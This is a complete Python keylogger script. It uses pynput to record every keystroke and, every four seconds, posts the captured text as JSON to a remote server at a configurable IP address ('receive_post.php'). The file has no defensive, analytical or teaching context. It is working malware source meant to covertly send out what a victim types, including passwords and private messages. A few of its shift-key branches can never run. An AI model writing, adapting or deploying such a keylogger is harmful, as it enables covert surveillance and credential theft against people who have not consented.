from pynput import keyboard
import requests
import json
import threading

text = ""

ip_address = "192.168.0.111"   # Change this
port = "80"

time_interval = 4

def key_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace:
        text += "[backSpace]"
    elif key == keyboard.Key.shift and len(text) == 0:
        pass
    elif key == keyboard.Key.shift and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")


def send_post_req():
    global text
    try:
        if text:  # Check if the list is not empty
            payload = json.dumps({"keyboardData": text})
            response = requests.post(f"http://{ip_address}:{port}/receive_post.php", data=payload, headers={"Content-Type": "application/json"})
            text = ""

        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    
    except requests.RequestException as e:
        print(f"Request error: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")



with keyboard.Listener(on_press=key_press) as listener:
    send_post_req()
    listener.join()
